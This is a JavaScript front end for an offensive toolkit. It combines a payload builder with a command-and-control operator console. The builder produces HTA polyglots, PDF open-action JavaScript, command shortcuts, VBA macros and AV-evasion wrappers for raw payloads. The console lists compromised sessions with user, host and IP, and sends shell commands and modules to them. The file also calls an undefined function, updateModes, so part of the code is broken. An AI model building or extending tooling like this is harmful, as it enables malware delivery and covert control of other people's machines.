document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('hider-form');
    const commandSelect = document.getElementById('command-select');
    const modeSelect = document.getElementById('mode-select');
    const fileInput = document.getElementById('file-input');
    const dropZone = document.getElementById('drop-zone');
    const submitBtn = document.getElementById('submit-btn');
    const btnText = submitBtn.querySelector('.btn-text');
    const loader = submitBtn.querySelector('.loader');
    const resultArea = document.getElementById('result-area');
    const downloadLink = document.getElementById('download-link');

    const config = {
        universal: {
            modes: ['hide', 'extract', 'hta-polyglot'],
            labels: { hide: 'Data to hide', 'hta-polyglot': 'VBScript / Command to run (e.g. calc.exe)' },
            showObfuscate: ['hta-polyglot'],
            showPassword: ['hide', 'extract']
        },
        pdf: {
            modes: ['view', 'edit', 'open-action'],
            labels: { edit: 'New Value', 'open-action': 'JavaScript (e.g. app.alert("X");)' },
            showObfuscate: ['open-action'],
            showPassword: []
        },
        office: {
            modes: ['view', 'edit'],
            labels: { edit: 'Value' },
            showObfuscate: [],
            showPassword: []
        },
        dll: {
            modes: ['view', 'hide', 'extract'],
            labels: { hide: 'Data to hide' },
            showObfuscate: [],
            showPassword: []
        },
        video: {
            modes: ['view', 'edit'],
            labels: { edit: 'Value' },
            showObfuscate: [],
            showPassword: []
        },
        lsb: {
            modes: ['hide', 'extract'],
            labels: { hide: 'Data to hide' },
            showObfuscate: [],
            showPassword: ['hide', 'extract']
        },
        audio: {
            modes: ['hide', 'extract'],
            labels: { hide: 'Data to hide' },
            showObfuscate: [],
            showPassword: ['hide', 'extract']
        },
        archive: {
            modes: ['hide', 'extract'],
            labels: { hide: 'Data to hide' },
            showObfuscate: [],
            showPassword: ['hide', 'extract']
        },
        shortcut: {
            modes: ['generate'],
            labels: { generate: 'Command to execute' },
            showObfuscate: [],
            showPassword: []
        },
        evasion: {
            modes: ['generate'],
            labels: { generate: 'Raw Payload (e.g. powershell -c calc)' },
            showObfuscate: [],
            showPassword: [],
            showEvasionOptions: ['generate']
        },
        vba: {
            modes: ['generate'],
            labels: { generate: 'Raw Payload to execute' },
            showObfuscate: [],
            showPassword: [],
            showEvasionOptions: ['generate']
        }
    };

    function updateForm() {
        const command = commandSelect.value;
        const configOptions = config[command];
        
        // Ensure mode is valid for command by updating mode options
        modeSelect.innerHTML = configOptions.modes.map(m => `<option value="${m}">${m.replace('-', ' ')}</option>`).join('');
        // Retain selection if possible
        const mode = configOptions.modes[0];
        
        const keyGroup = document.getElementById('key-group');
        const dataGroup = document.getElementById('data-group');
        const obfuscateGroup = document.getElementById('obfuscate-group');
        const passwordGroup = document.getElementById('password-group');
        const evasionGroup = document.getElementById('evasion-group');
        const fileUploadGroup = document.getElementById('file-upload');
        const dataLabel = document.getElementById('data-label');

        if (fileUploadGroup) {
            if (['shortcut', 'evasion', 'vba'].includes(command)) {
                fileUploadGroup.style.display = 'none';
                fileInput.removeAttribute('required');
            } else {
                fileUploadGroup.style.display = 'block';
                fileInput.setAttribute('required', 'required');
            }
        }

        // Toggle Key/Value vs Data
        if (['edit'].includes(mode) && ['pdf', 'office', 'video'].includes(command)) {
            if(keyGroup) keyGroup.style.display = 'block';
            if(dataGroup) dataGroup.style.display = 'block';
            if(dataLabel) dataLabel.textContent = configOptions.labels[mode] || 'Value';
        } else if (['view', 'extract'].includes(mode)) {
            if(keyGroup) keyGroup.style.display = 'none';
            if(dataGroup) dataGroup.style.display = 'none';
            if (command === 'dll' && mode === 'hide') {
                 if(dataGroup) dataGroup.style.display = 'block';
                 if(dataLabel) dataLabel.textContent = 'Data to hide';
            }
        } else {
            if(keyGroup) keyGroup.style.display = 'none';
            if(dataGroup) dataGroup.style.display = 'block';
            if(dataLabel) dataLabel.textContent = configOptions.labels[mode] || 'Payload / Data';
        }

        // Hide Data field for view/extract universally
        if(mode === 'view' || mode === 'extract') {
             if(dataGroup) dataGroup.style.display = 'none';
        }

        // Toggle Obfuscate
        if (configOptions.showObfuscate && configOptions.showObfuscate.includes(mode)) {
            if(obfuscateGroup) obfuscateGroup.style.display = 'flex';
        } else {
            if(obfuscateGroup) obfuscateGroup.style.display = 'none';
        }

        // Toggle Password
        if (configOptions.showPassword && configOptions.showPassword.includes(mode)) {
            if(passwordGroup) passwordGroup.style.display = 'block';
        } else {
            if(passwordGroup) passwordGroup.style.display = 'none';
        }

        // Toggle Evasion Options
        if (configOptions.showEvasionOptions && configOptions.showEvasionOptions.includes(mode)) {
            if(evasionGroup) evasionGroup.style.display = 'block';
        } else {
            if(evasionGroup) evasionGroup.style.display = 'none';
        }
    }

    commandSelect.addEventListener('change', updateForm);
    // modeSelect is now entirely driven by commandSelect redraw, but we can bind to changes if needed:
    modeSelect.addEventListener('change', () => {
        // partial update if we had multi modes
    });

    // Initial load
    updateModes();

    // Drop zone handling
    dropZone.addEventListener('click', () => fileInput.click());
    
    fileInput.addEventListener('change', () => {
        if (fileInput.files.length) {
            dropZone.querySelector('.drop-zone__prompt').textContent = fileInput.files[0].name;
        }
    });

    ['dragover', 'dragleave', 'drop'].forEach(evt => {
        dropZone.addEventListener(evt, e => {
            e.preventDefault();
            if (evt === 'dragover') dropZone.classList.add('drop-zone--over');
            else dropZone.classList.remove('drop-zone--over');
        });
    });

    dropZone.addEventListener('drop', e => {
        if (e.dataTransfer.files.length) {
            fileInput.files = e.dataTransfer.files;
            dropZone.querySelector('.drop-zone__prompt').textContent = fileInput.files[0].name;
        }
    });

    // Form submission
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        btnText.classList.add('hidden');
        loader.classList.remove('hidden');
        submitBtn.disabled = true;
        resultArea.classList.add('hidden');

        const formData = new FormData(form);
        
        try {
            const resp = await fetch('/api/process', {
                method: 'POST',
                body: formData
            });
            const result = await resp.json();

            if (result.success) {
                downloadLink.href = `/download/${result.filename}`;
                resultArea.classList.remove('hidden');
                resultArea.scrollIntoView({ behavior: 'smooth' });
            } else {
                alert('Error: ' + result.error);
            }
        } catch (err) {
            alert('Request failed. Make sure the server is running.');
        } finally {
            btnText.classList.remove('hidden');
            loader.classList.add('hidden');
            submitBtn.disabled = false;
        }
    });
    // ─── C2 Operator Console Logic ───
    const c2SessionsBody = document.getElementById('c2-sessions-body');
    const c2InteractPanel = document.getElementById('c2-interact-panel');
    const c2ActiveSessionInfo = document.getElementById('c2-active-session');
    const c2ResultsDiv = document.getElementById('c2-results');
    const c2CmdInput = document.getElementById('c2-cmd-input');
    const c2SendBtn = document.getElementById('c2-send-btn');
    const refreshSessionsBtn = document.getElementById('refresh-sessions-btn');
    const autoRefreshBtn = document.getElementById('auto-refresh-btn');
    const c2QuickBtns = document.querySelectorAll('.c2-quick-btn');

    let c2ActiveSessionId = null;
    let c2AutoRefreshInterval = null;

    async function fetchSessions() {
        try {
            const resp = await fetch('/api/c2/sessions');
            const data = await resp.json();
            
            if (data.error) throw new Error(data.error);
            
            if (data.length === 0) {
                c2SessionsBody.innerHTML = '<tr><td colspan="8" style="text-align: center; padding: 1rem; color: #a1a1aa;">No active sessions found.</td></tr>';
                return;
            }

            c2SessionsBody.innerHTML = '';
            data.forEach(s => {
                const tr = document.createElement('tr');
                tr.style.borderBottom = '1px solid rgba(255,255,255,0.05)';
                const statusColor = s.status === 'active' ? '#10b981' : '#f43f5e';
                const isSelected = s.id === c2ActiveSessionId;
                if (isSelected) tr.style.background = 'rgba(255,255,255,0.05)';
                
                tr.innerHTML = `
                    <td style="padding: 8px; font-family: monospace;">${s.id}</td>
                    <td style="padding: 8px;">${s.username}</td>
                    <td style="padding: 8px;">${s.hostname}</td>
                    <td style="padding: 8px; max-width: 150px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="${s.os}">${s.os || 'Unknown'}</td>
                    <td style="padding: 8px;">${s.ip}</td>
                    <td style="padding: 8px; font-size: 0.85rem;">${s.last_seen}</td>
                    <td style="padding: 8px; color: ${statusColor}; font-weight: 600;">${s.status.toUpperCase()}</td>
                    <td style="padding: 8px;">
                        <button class="btn-secondary interact-btn" data-id="${s.id}" style="padding: 0.2rem 0.6rem; font-size: 0.8rem;">
                            ${isSelected ? 'Deselect' : 'Interact'}
                        </button>
                    </td>
                `;
                c2SessionsBody.appendChild(tr);
            });

            // Bind interact buttons
            document.querySelectorAll('.interact-btn').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    const sid = e.target.getAttribute('data-id');
                    if (c2ActiveSessionId === sid) {
                        c2ActiveSessionId = null;
                        c2InteractPanel.classList.add('hidden');
                    } else {
                        c2ActiveSessionId = sid;
                        c2ActiveSessionInfo.textContent = sid;
                        c2InteractPanel.classList.remove('hidden');
                        fetchResults();
                    }
                    fetchSessions(); // redraw selection highlight
                });
            });

        } catch (err) {
            console.error('Failed to fetch sessions:', err);
        }
    }

    async function fetchResults() {
        if (!c2ActiveSessionId) return;
        try {
            const resp = await fetch(`/api/c2/results/${c2ActiveSessionId}`);
            const results = await resp.json();
            
            c2ResultsDiv.innerHTML = '';
            if (results.length === 0) {
                c2ResultsDiv.innerHTML = '<span style="color: #a1a1aa;">No command history.</span>';
                return;
            }

            // Loop backwards (newest at bottom)
            [...results].reverse().forEach(r => {
                const item = document.createElement('div');
                item.style.marginBottom = '1rem';
                item.style.borderBottom = '1px dashed rgba(255,255,255,0.1)';
                item.style.paddingBottom = '0.5rem';
                
                const statusColor = r.status === 'completed' ? '#10b981' : '#fbbf24';
                
                let outputHtml = '';
                if (r.result) {
                    outputHtml = `<pre style="margin-top: 0.5rem; color: #d1d5db; white-space: pre-wrap; word-break: break-all;">${r.result.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`;
                }
                
                item.innerHTML = `
                    <div style="display: flex; gap: 0.5rem;">
                        <span style="color: ${statusColor};">[#${r.id}]</span>
                        <span style="color: #60a5fa;">$ ${r.command}</span>
                    </div>
                    ${outputHtml}
                `;
                c2ResultsDiv.appendChild(item);
            });
            c2ResultsDiv.scrollTop = c2ResultsDiv.scrollHeight;
        } catch (err) {
            console.error('Failed to fetch results:', err);
        }
    }

    async function sendCommand(cmd, isModule=false, args=[]) {
        if (!c2ActiveSessionId || !cmd) return;
        try {
            const url = isModule ? '/api/c2/module' : '/api/c2/command';
            const payload = isModule 
                ? { session_id: c2ActiveSessionId, module: cmd, args: args }
                : { session_id: c2ActiveSessionId, command: cmd };
                
            const resp = await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            
            const data = await resp.json();
            if (data.error) {
                alert('Command failed: ' + data.error);
            } else {
                c2CmdInput.value = '';
                fetchResults(); // Refresh view immediately
            }
        } catch (err) {
            alert('Failed to send command.');
        }
    }

    // Bindings
    refreshSessionsBtn.addEventListener('click', () => {
        fetchSessions();
        if (c2ActiveSessionId) fetchResults();
    });

    autoRefreshBtn.addEventListener('click', () => {
        const isActive = autoRefreshBtn.getAttribute('data-active') === 'true';
        if (isActive) {
            clearInterval(c2AutoRefreshInterval);
            c2AutoRefreshInterval = null;
            autoRefreshBtn.setAttribute('data-active', 'false');
            autoRefreshBtn.textContent = 'Auto: OFF';
            autoRefreshBtn.classList.replace('btn-primary', 'btn-secondary');
        } else {
            c2AutoRefreshInterval = setInterval(() => {
                fetchSessions();
                if (c2ActiveSessionId) fetchResults();
            }, 3000); // 3 sec default
            autoRefreshBtn.setAttribute('data-active', 'true');
            autoRefreshBtn.textContent = 'Auto: ON (3s)';
            autoRefreshBtn.classList.replace('btn-secondary', 'btn-primary');
        }
    });

    c2SendBtn.addEventListener('click', () => {
        const rawCmd = c2CmdInput.value.trim();
        if (!rawCmd) return;
        
        // Check if module shorthand (e.g. "@sysinfo")
        if (rawCmd.startsWith('@')) {
            const parts = rawCmd.substring(1).split(' ');
            sendCommand(parts[0], true, parts.slice(1));
        } else {
            sendCommand(rawCmd, false);
        }
    });

    c2CmdInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') c2SendBtn.click();
    });

    c2QuickBtns.forEach(btn => {
        btn.addEventListener('click', (e) => {
            const mod = e.target.getAttribute('data-mod');
            sendCommand(mod, true);
        });
    });

    // Initial load
    fetchSessions();

});

